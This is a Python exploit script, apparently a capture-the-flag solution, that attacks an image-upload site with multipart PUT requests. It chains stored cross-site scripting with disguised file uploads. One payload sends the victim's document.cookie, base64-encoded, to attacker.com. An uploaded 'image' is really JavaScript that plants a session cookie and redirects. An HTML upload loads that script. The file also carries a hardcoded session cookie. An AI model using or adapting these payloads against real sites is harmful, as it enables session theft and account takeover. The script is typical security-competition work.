import requests


# set your cookie
cookies = {
    "SecretImageSession": "s%3AiAZg-gNNRpZG3P9KOMf8Dh_0yqCQjEVx.gyaGee5rlea2xaWiaopQzorHiTiFiQIRBpUjhL2y5n4"
}

userid = 'COQCZ4A557WUh8dgDEHAfMl'


# create items script, exploit and trigger

url = "https://index.onlysecrets.flu.xxx/api/image/script"
url2 = "https://index.onlysecrets.flu.xxx/api/image/exploit"
url3 = "https://index.onlysecrets.flu.xxx/api/image/trigger"
xss_page = 'https://index.onlysecrets.flu.xxx/#trigger'


headers3 = {
    "Connection": "close", "Pragma": "no-cache", "Cache-Control": "no-cache", "User-Agent": "EXPLOIT TEST", "DNT": "1", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryRDbGfw6GpD9OjeDY", "Accept": "*/*", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9,de;q=0.8,no;q=0.7"}
data3 = "------WebKitFormBoundaryRDbGfw6GpD9OjeDY\r\nContent-Disposition: form-data; name=\"file1\"; filename=\"zoom.png\"\r\nContent-Type: image/png\r\n\r\n\r\n------WebKitFormBoundaryRDbGfw6GpD9OjeDY\r\nContent-Disposition: form-data; name=\"description\"\r\n\r\n<img src=x onerror=\"location=`https://attacker.com/aaa?${btoa(document.cookie)}`\">\r\n------WebKitFormBoundaryRDbGfw6GpD9OjeDY--"
r3 = requests.put(url3, headers=headers3, cookies=cookies, data=data3)

print(r3.text)
print('test xss:')
print('https://index.onlysecrets.flu.xxx/#trigger')


headers = {
    "Connection": "close", "Pragma": "no-cache", "Cache-Control": "no-cache", "User-Agent": "EXPLOIT TEST", "DNT": "1", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryB5iiGUVzAAvpXoia", "Accept": "*/*", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9,de;q=0.8,no;q=0.7"
}
data = "------WebKitFormBoundaryB5iiGUVzAAvpXoia\r\nContent-Disposition: form-data; name=\"file1\"; filename=\"xss.js\"\r\nContent-Type: text/javascript,image/png\r\n\r\nconsole.log('setting cookie')\r\nfetch('https://attacker.com/aaaa?settingcookie', {{mode:'no-cors'}})\r\ndocument.cookie = 'SecretImageSession={};path=/api;domain=.onlysecrets.flu.xxx'\r\ndocument.location = '{}'\r\n------WebKitFormBoundaryB5iiGUVzAAvpXoia--\r\n".format(cookies['SecretImageSession'], xss_page)


r = requests.put(url, headers=headers, cookies=cookies, data=data)
print(r.text)

headers2 = {
    "Connection": "close", "Pragma": "no-cache", "Cache-Control": "no-cache", "User-Agent": "EXPLOIT TEST", "DNT": "1", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryB5iiGUVzAAvpXoia", "Accept": "*/*", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9,de;q=0.8,no;q=0.7"
}
data2 = "------WebKitFormBoundaryB5iiGUVzAAvpXoia\r\nContent-Disposition: form-data; name=\"file1\"; filename=\"xss.html\"\r\nContent-Type: image/png,text/html\r\n\r\n<script src=\"https://img.onlysecrets.flu.xxx/uploads/{}/script\"></script>\r\n------WebKitFormBoundaryB5iiGUVzAAvpXoia--\r\n".format(userid)

r2 = requests.put(url2, headers=headers2, cookies=cookies, data=data2)
print(r2.text)

print('https://img.onlysecrets.flu.xxx/uploads/{}/exploit'.format(userid))



